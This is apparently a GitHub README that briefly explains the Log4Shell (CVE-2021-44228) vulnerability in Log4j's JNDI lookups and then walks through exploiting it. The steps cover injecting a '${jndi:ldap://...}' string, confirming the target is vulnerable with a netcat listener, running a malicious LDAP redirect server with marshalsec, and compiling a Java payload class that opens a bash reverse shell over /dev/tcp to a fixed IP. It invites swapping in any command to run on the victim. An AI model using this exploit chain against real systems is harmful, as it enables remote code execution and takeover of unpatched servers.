
# About Log4Shell - CVE-2021-44228

Log4j is one of the most popular java frameworks. 

This framework involves an API call JNDI. 

This API allows developer to resolve naming services. JNDI has a function “Object lookup” which gives the possibility to return an object from its name.
For example, JNDI can query dns server to make correspondence between a domain name and an IP address, JNDI can also query a lot of services like LDAP or NIS…

The vulnerability takes place because log4j allow request to arbitrary LDAP or DNS server without checking the server response.
Then, an attacker can build malicious LDAP server and make the application execute a payload hosted on the fake LDAP.


## Overview of the Attack

![log4j schema Final](https://user-images.githubusercontent.com/76106120/147581673-63585c5c-ab97-47a8-ac34-b672aeb0be79.png)

# Exploit Log4j

## 1. Find Entry Point

You have to find entry point by injecting request to triggers JNDI lookup resolution to the malicious LDAP.

String to inject: ```${jndi:ldap://<ip>:<port>/<name-of-the-payload-to-execute>}```

First, you can start netcat listener and try to trigger it. 
If the netcat listener is trigger, then you know that the application is vulnerable. 

Demo:

![image](https://user-images.githubusercontent.com/76106120/147582133-b8466261-e23b-4b8f-b997-9541877b06e9.png)
![image](https://user-images.githubusercontent.com/76106120/147582157-c4408876-3af2-42fe-a5ea-8866a0913886.png)



## 2. Build Malicious Server

In our case we gonna build malicious ldap server.
For that you can download this github project: https://github.com/mbechler/marshalsec.git

Once you are in the project, you are able to build malicious ldap server that redirects connection to a web server which host the payload in order to provide it to the JNDI lookup resolution 

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://<Web-Server-IP>:<Port>/#<name-of-the-payload>
```
 Demo :
 
![image](https://user-images.githubusercontent.com/76106120/147582798-29cca013-e779-491a-81bc-7a933ebde226.png)


## 3. Build Java Payload

Java Payload


```
public class ExploitTest {

    static {
        try {
            java.lang.Runtime.getRuntime().exec(new String[] {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.170.0.120/9001 0>&1"}).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```


>Note: You can replace the last element of the string array by whatever command you want to be executed on the victim host

When your payload is done and ready, you can compile it.
>Note: Keep in mind that the name of your class must be in the same of your .java file otherwise you will get an error during the compilation.

Demo :

![image](https://user-images.githubusercontent.com/76106120/147583275-02f8f4ac-64fd-403f-8ffd-9d9e545429c4.png)

## 4. Ready to Exploit

You can now start web server in the directory of the .class payload.

Hope you get this:

![image](https://user-images.githubusercontent.com/76106120/147583452-0c5aea7f-f4cc-4aa6-bd64-f36c7d5e1490.png)
